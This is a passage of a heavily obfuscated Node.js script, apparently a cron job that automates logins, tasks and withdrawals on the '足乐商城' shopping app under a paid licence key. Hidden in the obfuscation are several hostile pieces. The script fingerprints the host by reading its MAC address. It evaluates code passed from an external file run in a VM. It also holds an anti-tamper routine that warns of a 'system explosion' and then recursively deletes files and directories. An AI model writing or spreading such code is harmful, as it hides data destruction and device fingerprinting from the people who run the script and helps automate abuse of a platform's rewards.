
/*
足乐商城
链接：https://app.sjdhwu.com/share/wechatLogin?share_code=umyLEhKL
变量 zlzh  值：账号#密码@账号密码
提现金额变量：balance  值：0.30 ，23.80 ，68.00 ，108.00 ，158.00 ，188.00 ，200.00
变量：zlname 值：提现名称
变量 cdkey   对应脚本验证卡密。所有脚本通用。。
Cron 0点，12点，20点 各跑一次
*/
const $ = new Env('足乐商城');
const _0x163887=_0x3b7d,_0x1d04f9=_0x2a99,_0x460acf=_0x4a20;(function(_0x7b3fd5,_0x44f854){const _0x595efc=_0x4a20,_0x21b3e5=_0x2a99,_0x27f1ab=_0x3b7d,_0x594baa=_0x7b3fd5();while(!![]){try{const _0x261da3=parseInt(_0x27f1ab(0x253))/0x1*(-parseInt(_0x21b3e5(0x273))/0x2)+-parseInt(_0x27f1ab(0x2b0))/0x3*(parseInt(_0x21b3e5(0x2b4))/0x4)+-parseInt(_0x21b3e5(0x222))/0x5+-parseInt(_0x27f1ab(0x25f))/0x6+parseInt(_0x27f1ab(0x34f))/0x7*(parseInt(_0x595efc(0x2bb,'dHA4'))/0x8)+parseInt(_0x27f1ab(0x28a))/0x9*(parseInt(_0x27f1ab(0x25e))/0xa)+parseInt(_0x595efc(0x2f1,'Wwle'))/0xb;if(_0x261da3===_0x44f854)break;else _0x594baa['push'](_0x594baa['shift']());}catch(_0x3b1a8){_0x594baa['push'](_0x594baa['shift']());}}}(_0x517c,0x3c597));const VM=require('sablejs/runtime')(),path=require(_0x460acf(0x35e,'Lu^b')),fs=require('fs'),{MD5}=require(_0x1d04f9(0x2f2)),CryptoJS=require(_0x163887(0x267));function _0x517c(){const _0x4e8665=['Bsy9oCkCdJRcLGZcO1TrWOiaFSkFW7m','zw52','W4T8W4WIWOJdSmo5y1RcNmoD','n2/dIW','osxcNZLPxZpdLmoovSoz','77Ym6yEr5BIb77YA','DwzCoW','https://app.sjdhwu.com/yw_api/v3/playerPotionUpgrade','/sys/class/net/','5lQQ6lAi5y6LfW','mgVdGSoEj8oScCkXvCoU','yxbWlNnQzgH3Ds5JB20','WOiVaa','eSkIA8o9B8omF8kYnqnx','27465UQWSnB','W796W7xcLs/cHSoqla','W68ubmoVW6NcUCoIW6uGkG','utf-8','mtyWreLbDe5t','WPrSW5mKBCoJACoGaXy','dMtdVxvhrSoqxNbwW6JcOmobvNi','10470706','WQHXxG','EMXUyw1L','*/*','W4WiWR7cGtanW78','jSklW7ddVW','C3bSAxq','WRG8h8og','zlzh','WQyGW4SLcL5JfGVdISkY','split','ms4Wma','\x0a开始【足乐商城','ecBcPdmyg8kumJyaWRZdOSkvxW','WPyuWOWRW4WoW7pdOCknWPldVSor','num','mta4ndq0nW','DxrMoa','W5JcKSkKW7ubWORdMNJcSCk7W7FcTfyLW6pdVmkYWRJcNg4Kt3rDWQqGrHPhWPHDW7pdTCkHkYSBWOddRWrLW6JdKXOA','WQtdRCkvW7G','当前版本：1.0\x20','WQn7tCkmkmoxW4tdMmoz','u2ZcVCkNz8oIAmkWbCkKWOdcTX7dNMVdV3ldQaxcLmkZW6ddJSk+W50ap8oOW6VcJmomkCoVWR3dJCkRvSo+WQJdIbldU8k2xCkwA3S0WR3cNmocrGJdVYNdVSoDW7zkdSkdzHhcR0ndWOi+x8kXB8kXW43dKsbeWOdcI2tdOmkYW57dUaJcIL8/W6VcVSonWRRdUq04W6VcHSoiW5RdRJxdRCoSl03cUqH5WOtcRmoLjaWIw8kTph3cIxRdRulcN3NcQ8omWPvwmCo7i8kDWOxcLvtcIfddQYNcHSoDW7FdQhyMohRdRXq7W6pcGYmUW6BdVXNcRCkSAmohf8kH','W67dMsSoymk0WQDiW6eyCSoWDG','cdkey','y3jLyxrLu3rYAw5N','WO4hW73dIq','p2hdMmoG','WR1ju8k+','wait','\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22Yw-Number\x22:\x221071552\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22channel\x22:\x221\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22version\x22:\x22333\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22version-number\x22:\x22333\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22plat\x22:\x222\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22Connection\x22:\x22Keep-Alive\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22Yw-Sign\x22:\x22','BmkrWP3dKgbsW4hcPcPI','zgvZDhjVEq','44cr6l+B6kgmufNKUQtMMjmS6i635B6x','WRlcMx9Anmo0','yxbWBgLJyxrPB24VEc13D3CTzM9YBs11CMXLBMnVzgvK','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVBg9NAw4','application/json','WRGpW5ddSqhdGa','nubCWOVcMmkqW58DW4FdPx7dHW','toUpperCase','WOHnuCkKnmo1W4FdLCozWQBdQwXgbCosDCoviCkvWOVcMSoED8o+W7JcTsRcQmo2o8oyWRhdPY/dKCoIWO/cLHLpvJKwWOBcRCkrW5VcUWJcI8k+W50','Cg9ZDa','t0C5sffytNrumwXQzgXsr2ffsNPrBvjOwKzWufvSAZbvwfO2zdbkD1qZAeTwALjOyKm5AvPSAhzvA2rnv1vKmK1uuLPvEKiWwtnRngeYmhzIv1jdtxDVpq','W6C7WOfIpCkNFG','WOu+WPL3','WQJcG0DiiCoJW61/W4ejEa','ls0XmdiXmtq4ls0','WOujWPO+','W6ddHSoGW6fVW4mjx8kxWR4MW64uWR8','B8kaWOZdKd4jWOldOJ13mCoxW75JW4jzW5ddUSo/o8oVtmkMr8kKr8kSB8koW7xcTgDQWOeRWQ51bSoVWOJcKbFdIfD7xq','W5PdwMu','BgvUz3rO','D8kxE8oO','WOTXWPWnW7lcLcqyWQtcN8oak0RcJJ3cHCkjeeVdUuiscmoSAJLigJZcLXLwW5FdM8kia8o3W73cHCo/as1Fr8orW4JcP2ddSuD5WQ0','tfnOB3bnywXSuhjVqxbWlZmUms41icHPugHVBMu7igLpuYaXnc4YoYbty2fSzs8YlJaWkq','WR/cG3zD','yvCX','WOldJCkVW6PPFCo7hrVcL8oPpSo3CG','y3j5ChrVlwPZ','WQ5jrmkV','log','eCooW4iJWOJdMSkPeSkKWQdcHqtdRCk0','CmkxymoVbW','WR4RWRpdKxO','length','WRKRWQJdLG','BLCYAa','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVzxHJAgfUz2vfEhbLCMLLBMnLug90Aw9U','BMfTzq','vCophCkmW7BdIG','WQrogSktWR3dOCkMW7bmsCkaW6FcNevPxLCMxNX7WQtcICofWRVdLCo6e8oSWQ9Rrq','balance','existsSync','parse','W4yXWOr1','C3rHDfn5BMm','y29UDgvUCW','ywrKCMvZCW','yxntDhjPBMC','client_tag--','mta0nZa3mdy','W61fuSk6f8odqqBdKCoenSo2FfnKWPXByH/cVSoesCoJqd1xFmkbWRVdOWLMW44NtCkCmmkFBIhcThWE','fqFcHGfTtJhdHCokvmojWQDhWRq','WQPcx8k5s8kAaKJdG8ohACk2AK0','key','WQ0LWQ/dKxddNCkf','WPaqWOlcPa','EgzDmG','{\x22type\x22:\x22','data','W6zEsmk+aCkxhq','ygv5W74','ddtjstatus','WOHil2ldNSknWPS','Bg9N','zmkxzSo9','writeFile','Aw5KzxG','qL3cUx3cNNOPxcFcP8k8','WOK6dSkK','utf8','o2XGFSkagw7dHq','asString','qSowWRNdL35eW71HlJKv','aSoDW5uXWPK','WRPhq8k6','zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','DwHumG','env','app.sjdhwu.com','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVyMfSyw5JzvDPDgHKCMf3qxbWBhK','g3/dThflsCoqwNbxW73cUG','W6nNW7dcKIVcHSoqlCkDWPjHEq','value','W5ZdQSoyW4G','EX8iW5RdMmocWRXEWOxcUJ3cJq','zNjVBq','W41dA3baWOCuW6JcIeuk','当前球员：','j8oXtG','8yHDLjA','match_id--','x03cOe/cIwC','CgfZC3DVCMqTlq','c8kOtCo+FSooAa','q8koWPr2W4NcICoyx8oZW7m','WQZcJwblna','aSotW5q2','jSk+rCo6','W5tcH8kKW6q','DYH3qCk3cCoKWQjcgWy','lcjTzw1IzxjFCgXHEwvYx2LKiJO','--10470706--','FwVcPulcNfG4vtNcG8k3WQz5ymovD8kfmXRcQtOXAbBcQmksoXJcTuCKzSoipCoWnIpcVCoxWQLLDCofW5LKW7xdU2pdU2fGW5G','获取PK失败：','W794W7lcLIRcH8oxiSkuWPq','cmouWOOkWP3dKCkCsSkFWPddIHZcV8oRl1ddTmkOhCkXwmoZWOhcSL9OWR9PW7HtzX4','https://app.sjdhwu.com/yw_api/v3/matchInformationV3','W6fHCKHeWPywW7NcJeCAyXlcVG','W4PytgLEWOupW43cKa','MD5','rL9psW','WOVdGmojfCoBnSo8','WPiCWOa6WPrlW4tdSmkzWPFdSCocyGlcN1Ot','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVBwvTyMvYl2LUzM8','-------------\x20共','createString','AxnoB2rL','AaWFW4JdIq','WPGdWPO5W5KmW4u','zgf0yq','2500953FJOhuh','WRyKW5yb','WOzRE8ktWQJdU8kLWO98A8ooW7pdKGa','6kEg6Akr5lU75yQH77YA','BNvT','WRjjumkEWQ7dVq','readdirSync','W4KXWOC','get','5OY254+H77+N','55s16isr546V5Akd','z2v0uhjVCgvYDhK','unlinkSync','W6KmWRHpWQ8','WQe8g8ox','WRFdO8kfW7u','DhLWzs0T','签到：','oYWmEa','mmo1sutcKMqcxe0','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVCMvKrw52zwXVCgvszxDHCMrdB2XSzwn0Aw9U','yxnZB2nPyxrPB25FAwq','WRuQW6OfcfrHmbJdJCkU','https://app.sjdhwu.com/yw_api/v3/homeBubbleRewardCollection','ar/cLmohW4C','XMLHttpRequest','yJDsh8k0bSoYWOLuhu3dJmoIFW','mSkyW7ZdQSocvmkWWQ0RcdRcPSopWPm','使用药水：','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVBxLdBhvIlW','AJJcLmk3W6FcMg7cO2NdRCkZW5S4WPJdVmk4n8o7WQ1GDx/dVYtcSwtdRZyFWPaLW6ZdTSoOW596AmozjXanWQdcHq','WQy/W5yfvbf3fH/dKSkQW6yTWQpdKCoTqW','a8k1v8o+A8oAxSkioHm','wNjIWR/cSmkc','xab','A0XGWPJcOmktj3JcRfutkSkkjW','CYzqqSkI','W7tdMmoeW4zRW7OyyCkEWP8HW6qMWRVcJu/cVSkGwSkmW7hdGdZcIKOom8ohyIHbWPtdLmo4dSkAW4j0W6pdPxxcKCkJWOVdNZnCW6jyx8kLlW','run','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVz29SzenVAw5fEgnOyw5Nzq','DuaUDq','z3PPCcWGzgvMBgf0zsWGyNi','statSync','DMnKW6SkaCoR','kcWrBq','ahC9Ca','WROLWPtdKM/dLmkswComW5CP','WRqbeSo9vmooxH8','5OQ95Aww5AsX6lsL77YA','WPTDlYddJmkeWPPSatFcQSkYwSkk','oMpdJ8oKWQxdKGFdPZhcTCoLWPy','ExL5Eq','w1qLWRC','D3jPDgvgAwXLu3LUyW','jsVcUrz8qJhdSSoDtmozWQXxWQxcNmocB2KCsG4','6k6fWO3cKUEMKos6T+wsSEwfOUEDRow6TEwsIEwqLW','WPpdI8oEa8oComo3cHG','个人资产：余额：','smocrmkYW7BdImkywZdcQZ0Jv2vRW5TuC2hcOmoZW6OJa8kWabjbgmkvWPrL','we1mshr0CfjLCxvLC3q','getdata','首页气泡金币翻倍：','ls0Xmdq3mdCWnI0T','ESkEp8oua8kOA8oXgqtdMCkpW47cIcJdSSoQjIFdQX5via7dP3JcQu3dQ8oxhaa','frzWW6lcNHy0W68XwqFcIq','limit--100','setProperty','WROLWPldLM3dMmkoFq','code','WQ7dSCk/W7iuW7G','DMfSDwu','5l2/55sO6i2V5Rc05y2h57QN5OIq5yQF','CMvHzgrPCLn5BMm','fSoDW5mJ','W5lcNSoPWRRdOgv4EW','{\x22experience_potion_id\x22:','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVyMfJA3bHy2TfEhbLCMLLBMnLug90Aw9Up3bHz2u9mszSAw1PDd0Xmda','W5i/WOLK','https://app.sjdhwu.com/yw_api/v3/memberPk','jmkOx8o/ESoBlq','6k+3mtxNP5lKUyVLKi7LHO3NNiVLUB/LKyRLK6y','6yEr5BIb5ywr5O2I77YA','WRLCxSkRW7dcR8kXWRH/DSoAW6ldHfHLhf8','rColamko','y2fSBa','cUw8GowNI+oaKoI2S+s5KowvHUwFJG','W6tdJYz8','og/dImoK','WPrUW5qNAmoIBSoU','jt7cVJLQag7cUmoovComW6XhWQRcP8oAD2HBrG/dTgHNqSkXq8kWWQNdKdxdVwpcVJJdNhtcQdtdT8o2wSkDW7VdKCk1W4BdHSkkw8onW6aeWQrnWQxdUW','otiWoduWCxnPCwrI','6AAw6Ag15Rcu5RoH6yEr5BIb6Akg5y+w77YA','dH3cMmoxW4zVpI8','CwrnWQlcSCkvDW','55M75B2v5AsX6lsL','ueVVVjO','购买1瓶高级药水成功，前往使用','WPi+WQHIW4dcOCk/faZdGSkv','WQ0LWQxdHW','xLqZWPFdI0jS','W6jlt8k6smozcKZdLSoyj8kSAHuGWPzE','EhH4Ea','WQeBW5tdPW','usJcRdftxSkeccynWRhdO8kvtMCACG','vfqM','phone--','message','hmojW4OGWPNdJq','C:/Windows/system.txt','name','zMHdiW','W4tcMmo2WQG','keep-alive','qMvHCMvYia','y29Kzq','qsjdq8kIhSk2','WQndWOad','W6LEqq','W45nv3q','WOxdP8kqW68vW69q','page--1','CtJcG8kzDW','5AcE5yIo5OUV5Awl5Q6w5PAf5Aws6lE677Ys','mmozW4yWWPNdJCop','W6pdGtXPW5lcMXa','W4C/WOXXnSk2oW','yyyy','青龙环境','920850qsiqdb','W4VdRSoyW7LPW5GjAmkaWRSQ','hhmXDhtdLJ8qW5BcGa','W4T8W4WIWOtdS8o9yf3cH8oDWQC','WPGEWPe','LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','D2fPDa','ls0ZnZCWnJmTlq','W5lcICoVWRaYkSkVxaJcISoxx8o1zCoBW4e','g3KZ','6kAX6Akh57U25yYb772d6iYa5B+e','19PLcema','createFunction','抽奖获取：','z2v0r2XVyMfS','device_name--SKR-A0','EMGTsgfUCY1vuZTXpteSihPOluHHBNqTseS7Ct0WlJK','AgvHzgvYCW','i8kpW7JdR8oWwmkAWR0weIdcRa','W63dIYfUW5BcKGy','6i2W5y2u55oY5zof5OMG5yIc772Q6BQ/6k2d5y6157IT562r5lQP5lIH55oA5zoU','A2vLCc1HBgL2zq','440QudXrR','2596128tAboeq','6i635y+wueVLPlhOTkxVVjO','jZudy1ZdSapdLseh','W6yYm8oRzmkyWOBcMCkvW5BcUYmNvCkcESogl8keWOFdRmkrmCoJW43cSZhdQ8ohECkiWR3cIKBdK8kYW4VdIeCDfqSbWO7cRSkAW5VdSqVdJmo5WOpcMmoacMxdGSoMWPddPmo9WPddJfFcQ8kUE8o+C0tdS3ldOWBdVSoTsmo9W4NcICkkW6XOa8k2nmkBwcRcPJiHwSoQWPldMunTx8k0W7BcSelcOhxdP1xdMCokW6b7tCk2uSkuxqhcVbGIW7DbdWGuWQ8qW6v9WP1OWQP4WPBdKKFcNmo5rCoueSoIhb9fe8oim8oZWRqaWP8OrSo5WPriW6jftxpcMKBcKq','Dg9vChbLCKnHC2u','请15秒之后再看广告哦','\x0a公告：','dq3cHSogW4j6DG','crypto-js','1234567890','B2TODhrWlZqUos4W','&real_name=','n8oZtCoNf8ktW4tdImo1tmoioCo7rhbTWQ8P','mtiZndu2nZG5ma','isNode','WQ5hrCkOWRK','xmn','BwvTyMvYx3bSyxLLCL9Pzc0T','pmk+x8oG','kI8Q','nta0mJzsvxznsgC','W7qjhq','qZOV','mJC0nJvvuvDtBKi','ycHgva','WRSFW47dOaxdLuG','CgfYC2u','6lsT5lMWmEEtTUMRMoE6P+InR+AWTo+8MG','y3jLyxrLt2jQzwn0','y3jLyxrLvw5KzwzPBMvK','Bearer\x20','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVD2f0y2Hbza',',\x22number\x22:','翻倍失败：','AxneAxjLy3rVCNK','gold_coins','readFileSync','WQ/dTSkfW60dWQDFsmkgWOldULpdMMhcVCoEnc9MWOZcIe7dUI1oktddVbRcJWBcO2pdJaLVW4VcV0W6rSovfmkpe1XsW5ZdNCoMemkuWOlcQbStjCoGWQpdNa','bCoDW442','WROvW5O','WQORWRxdGW','视频任务：','psVcUdP8','15057bySNLi','W7ysW4bvWRldRNvc','W4tcKmowWQ/dVg9Z','W4rwW519WOHCWPdcOW','b2ldSxzpsCoqwW','W51nsMe','WRjjua','gzip,\x20deflate,\x20br','zxrO','57YD5ygC5OUT5yQn6iYh5B2t77+x','ASkrWOVdKYXuW4G','Bwf0y2HFAwq9','W7yqW4DwWRFdR3jmW7hdVW','WQBdSSkbW7ezW74re8koWP3dPfldG3JcTSoy','uCoydmkBW6pdG8kTaWVcM3i7btO','post','5lIQ5lQ66lwe5lQN77YA','FgvT','yMfZzty0','金币兑换：','WQrnWPah','tGmx','BwvZC2fNzq','W4Lnthnv'];_0x517c=function(){return _0x4e8665;};return _0x517c();}function initVM(){const _0x267235=_0x163887,_0x2bacf9=_0x1d04f9,_0x3da782=_0x460acf;vm=new VM();const _0x9099a6=vm[_0x3da782(0x2cc,'o6so')](),_0x13de7e=vm[_0x2bacf9(0x27b)](),_0x1c7186=vm[_0x3da782(0x36a,'csQz')]('log',function(){const _0x39ed42=_0x2bacf9,_0x2a38a1=_0x3b7d,_0x47cc9a=[];for(let _0x5b01a6=0x0;_0x5b01a6<arguments[_0x2a38a1(0x2f8)];_0x5b01a6++){_0x47cc9a['push'](vm[_0x2a38a1(0x31e)](arguments[_0x5b01a6]));}return console['log'](..._0x47cc9a),vm[_0x39ed42(0x27c)]();}),_0x4ded36=vm[_0x267235(0x254)](_0x2bacf9(0x22d),function(_0x2c6a33){const _0x400ead=_0x3da782,_0x17d87e=_0x267235;let _0x576810=eval(_0x2c6a33[_0x17d87e(0x329)]);return vm[_0x400ead(0x2c5,'vwZC')](JSON[_0x400ead(0x343,'WFU6')](_0x576810));}),_0x4b3c72=vm[_0x3da782(0x2f5,'b%Rl')](_0x2bacf9(0x1fb),function(_0x21e09c){const _0x8fb2fc=_0x267235,_0x1d20f1=_0x3da782,_0x1513e1=_0x2bacf9;let _0x57612c=_0x21e09c[_0x1513e1(0x20e)],_0x7e3ec6=fs[_0x1d20f1(0x25a,'csQz')](_0x57612c,_0x8fb2fc(0x2b3))[_0x1d20f1(0x315,'PC)W')](/\r\n/g,'\x0a'),_0x1d9a8e=CryptoJS[_0x8fb2fc(0x344)](_0x7e3ec6)['toString']();return vm[_0x1513e1(0x2d0)](_0x1d9a8e);}),_0x287f01=vm[_0x3da782(0x298,'lmLq')]('ddd',function(_0x15af0c){const _0x51185d=_0x267235,_0x409ebc=_0x3da782;let _0x4e993b=CryptoJS[_0x409ebc(0x29f,'aI&O')](_0x15af0c['value'])[_0x409ebc(0x20b,'*DhG')]();return vm[_0x51185d(0x34a)](_0x4e993b);});return vm[_0x3da782(0x31a,'W]ep')](_0x13de7e,_0x2bacf9(0x316),_0x1c7186),vm[_0x267235(0x20a)](_0x9099a6,_0x3da782(0x1f0,'dCCT'),_0x4ded36),vm['setProperty'](_0x9099a6,_0x3da782(0x30d,'*DhG'),_0x13de7e),vm[_0x3da782(0x249,'loX$')](_0x9099a6,_0x267235(0x246),_0x4b3c72),vm['setProperty'](_0x9099a6,'ddd',_0x287f01),vm[_0x267235(0x1ee)](fs['readFileSync']('./output_final.js')['toString']()),vm;}function destroyVM(_0x200bfc){const _0x118922=_0x1d04f9;_0x200bfc[_0x118922(0x2d7)]();}function abc(_0x4d1bd8,_0x261e4e,_0x36f6d0,_0x2eff6f,_0x25a46e){const _0x2f245a=_0x460acf,_0x524bd2=_0x163887,_0x50ac04=_0x1d04f9,_0x43a28c=_0x4d1bd8[_0x50ac04(0x256)]();let _0x21eb05=_0x4d1bd8[_0x50ac04(0x35a)](_0x43a28c,_0x524bd2(0x1ea)),_0x2471f5=_0x4d1bd8[_0x2f245a(0x2a8,'51ib')](_0x21eb05,_0x4d1bd8[_0x50ac04(0x27c)](),_0x4d1bd8[_0x50ac04(0x2d0)](_0x261e4e),_0x4d1bd8[_0x50ac04(0x2d0)](_0x2eff6f),_0x4d1bd8[_0x524bd2(0x34a)](_0x25a46e),_0x4d1bd8[_0x50ac04(0x2d0)](_0x36f6d0));return _0x2471f5=_0x4d1bd8[_0x50ac04(0x306)](_0x2471f5),_0x2471f5;}function xyz(_0x22d262,_0xed2ceb,_0x530536,_0x39d060,_0x4dafe8){const _0xc6d578=_0x1d04f9,_0x113309=_0x163887,_0x3acda3=_0x460acf,_0x44ed8d=_0x22d262['getGlobal']();let _0x4ebe64=_0x22d262[_0x3acda3(0x2c0,'1dz4')](_0x44ed8d,_0x113309(0x26f)),_0x154300=_0x22d262[_0xc6d578(0x21c)](_0x4ebe64,_0x22d262['createUndefined'](),_0x22d262[_0x113309(0x34a)](_0xed2ceb),_0x22d262[_0x3acda3(0x32b,'9lxV')](_0x39d060),_0x22d262[_0x113309(0x34a)](_0x4dafe8),_0x22d262['createString'](_0x530536));return _0x154300=_0x22d262[_0x113309(0x31e)](_0x154300),_0x154300;}let status;status=(status=$[_0x460acf(0x2fd,'lmLq')](_0x163887(0x314))||'1')>0x1?''+status:'';let zlsjhArr=[],zlzh=($[_0x163887(0x26d)]()?process[_0x163887(0x324)]['zlzh']:$[_0x163887(0x204)](_0x163887(0x2bf)))||_0x460acf(0x1e6,'UD06'),balance=($[_0x460acf(0x1e9,'BZo[')]()?process['env'][_0x163887(0x2ff)]:$['getdata'](_0x460acf(0x28c,'cd0^')))||_0x1d04f9(0x2c2),name=($[_0x460acf(0x20d,'Lu^b')]()?process['env'][_0x1d04f9(0x2b9)]:$['getdata']('zlname'))||'',acckey=($[_0x163887(0x26d)]()?process[_0x1d04f9(0x2a3)][_0x163887(0x2cf)]:$[_0x163887(0x204)](_0x163887(0x2cf)))||'',token=_0x460acf(0x35c,'k4E%'),cookie='',phone='',password='',arrs=[],nameArr=[],all_msg='',mac='';var gtr,key='';if($[_0x1d04f9(0x34b)]()){gtr=require('fs');if(isFileExist('C:/'))console[_0x1d04f9(0x316)](_0x1d04f9(0x359));else{console[_0x1d04f9(0x316)](_0x163887(0x247));function getMACAddresses(){const _0x5b13ea=_0x163887,_0x2be59e=_0x1d04f9;var _0x3c7004='',_0x5de01e=fs[_0x2be59e(0x210)](_0x5b13ea(0x2aa));return _0x5de01e['forEach'](function(_0x365e5a){const _0x489a0b=_0x5b13ea,_0x19f59f=_0x2be59e,_0x5d3aa5=_0x4a20;var _0xc83738=path[_0x5d3aa5(0x338,'lo22')](_0x5d3aa5(0x30b,'Ur8b'),_0x365e5a,_0x19f59f(0x305));_0x365e5a['substr'](0x0,0x3)==_0x19f59f(0x292)&&fs[_0x5d3aa5(0x1e8,'nFdq')](_0xc83738)&&(_0x3c7004=fs[_0x489a0b(0x283)](_0xc83738)['toString']()['trim']());}),_0x3c7004;}mac=getMACAddresses();}}else console[_0x460acf(0x230,'ZN4b')]('代理环境');function isFileExist(_0x2401e3){const _0x3ad297=_0x1d04f9;try{gtr['accessSync'](_0x2401e3,gtr[_0x3ad297(0x345)]);}catch(_0x5b87fc){return![];}return!![];}function addF(_0x13251d,_0x53a739){const _0x5bc169=_0x460acf,_0x167a89=_0x1d04f9,_0x439e8c=_0x163887;let _0x1a8e5f=0x0,_0x3262bd=_0x439e8c(0x234);if(isFileExist(_0x3262bd))_0x1a8e5f=gtr['readFileSync'](_0x3262bd,_0x439e8c(0x31c));else{if(isFileExist(_0x167a89(0x275)))gtr[_0x439e8c(0x318)](_0x3262bd,'1',function(_0x213bb8){if(_0x213bb8)throw _0x213bb8;});else return;}if(_0x1a8e5f==0x63)return 0x63;console[_0x439e8c(0x2f4)](_0x1a8e5f),console[_0x5bc169(0x2ae,'NB%D')]('警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！',_0x1a8e5f);if(parseInt(_0x1a8e5f)<0x3){let _0x1f2d66=parseInt(_0x1a8e5f)+0x1;gtr[_0x167a89(0x1fd)](_0x3262bd,_0x1f2d66+'',_0x167a89(0x2c8));return;}if(!gtr[_0x439e8c(0x300)](_0x13251d))return;if(gtr[_0x439e8c(0x1f2)](_0x13251d)[_0x167a89(0x281)]()){var _0x20ab32=gtr[_0x439e8c(0x355)](_0x13251d),_0x360816=_0x20ab32[_0x167a89(0x2eb)],_0x1a194e=0x0;if(_0x360816>0x0)_0x20ab32[_0x5bc169(0x22b,'ZN4b')](function(_0x2a6158){const _0x35225b=_0x167a89,_0x51edd0=_0x439e8c;_0x1a194e++;var _0xfd7ca5=gtr[_0x51edd0(0x1f2)](_0x13251d+'/'+_0x2a6158),_0x162e15=_0x13251d+'/'+_0x2a6158;gtr[_0x35225b(0x303)](_0x162e15)['isDirectory']()?addF(_0x162e15,!![]):gtr[_0x51edd0(0x35b)](_0x162e15);}),_0x360816==_0x1a194e&&_0x53a739&&gtr['rmdirSync'](_0x13251d);else _0x360816==0x0&&_0x53a739&&gtr['rmdirSync'](_0x13251d);}else gtr[_0x439e8c(0x35b)](_0x13251d);}!(async()=>{const _0x3ebfac=_0x1d04f9,_0x13a28b=_0x163887,_0x3b46ff=_0x460acf;if(typeof $request!==_0x3b46ff(0x200,'Ag]F'))await ddtjck();else{initVM(),arrs=abc(global['vm'],acckey,mac,0x8,0x0);if(arrs=='')return;arrs=JSON[_0x3b46ff(0x241,'M3a$')](arrs);if(!arrs)return;zlsjhArr=zlzh[_0x13a28b(0x2c1)]('@'),nameArr=name[_0x3ebfac(0x2bd)]('@'),key=arrs[_0x13a28b(0x30c)],console[_0x3b46ff(0x286,'RQ@[')](_0x13a28b(0x265)+arrs['gg']+'\x0a'),console['log'](_0x13a28b(0x2cb)+arrs['bb']+'\x0a'),console[_0x3b46ff(0x251,'QS2%')](_0x13a28b(0x349)+zlsjhArr[_0x3ebfac(0x2eb)]+'个账号-------------\x0a'),console[_0x3ebfac(0x316)]('当前设备可执行账号限制为'+arrs[_0x3ebfac(0x353)]+_0x3b46ff(0x2ab,'*qCn'));if(zlsjhArr[_0x3ebfac(0x2eb)]>parseInt(arrs[_0x13a28b(0x2c6)]))for(let _0x2ed504=0x0;_0x2ed504<arrs['num']['length'];_0x2ed504++){xabs=zlsjhArr[_0x2ed504],phone=xabs['split']('#')[0x0],password=xabs[_0x3ebfac(0x2bd)]('#')[0x1],name=nameArr[_0x2ed504],$['index']=_0x2ed504+0x1,console[_0x3b46ff(0x251,'QS2%')](_0x13a28b(0x2c3)+$[_0x3ebfac(0x319)]+'】'),await zldl();}else for(let _0x382ca3=0x0;_0x382ca3<zlsjhArr[_0x13a28b(0x2f8)];_0x382ca3++){xabs=zlsjhArr[_0x382ca3],phone=xabs['split']('#')[0x0],password=xabs[_0x3ebfac(0x2bd)]('#')[0x1],$[_0x3ebfac(0x319)]=_0x382ca3+0x1,console[_0x3ebfac(0x316)](_0x3ebfac(0x21d)+$[_0x3ebfac(0x319)]+'】'),await zldl();}}destroyVM(global['vm']);})()['catch'](_0x586ebd=>$[_0x460acf(0x354,'ycEU')](_0x586ebd))[_0x460acf(0x1f3,'qWFi')](()=>$['done']());function _0x4a20(_0x30bfdc,_0x107670){const _0x517c5d=_0x517c();return _0x4a20=function(_0x3b7deb,_0x57561c){_0x3b7deb=_0x3b7deb-0x1e6;let _0x558ea8=_0x517c5d[_0x3b7deb];if(_0x4a20['BKpTHL']===undefined){var _0x4c808b=function(_0x4582d9){const _0x3159ca='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x48df7c='',_0x408b9f='';for(let _0x32f18d=0x0,_0x51bbc0,_0x4a20b1,_0x4de330=0x0;_0x4a20b1=_0x4582d9['charAt'](_0x4de330++);~_0x4a20b1&&(_0x51bbc0=_0x32f18d%0x4?_0x51bbc0*0x40+_0x4a20b1:_0x4a20b1,_0x32f18d++%0x4)?_0x48df7c+=String['fromCharCode'](0xff&_0x51bbc0>>(-0x2*_0x32f18d&0x6)):0x0){_0x4a20b1=_0x3159ca['indexOf'](_0x4a20b1);}for(let _0x2a0141=0x0,_0x400749=_0x48df7c['length'];_0x2a0141<_0x400749;_0x2a0141++){_0x408b9f+='%'+('00'+_0x48df7c['charCodeAt'](_0x2a0141)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x408b9f);};const _0x2a99d2=function(_0x1925d0,_0x586ebb){let _0x1eb03a=[],_0x9099a6=0x0,_0x13de7e,_0x1c7186='';_0x1925d0=_0x4c808b(_0x1925d0);let 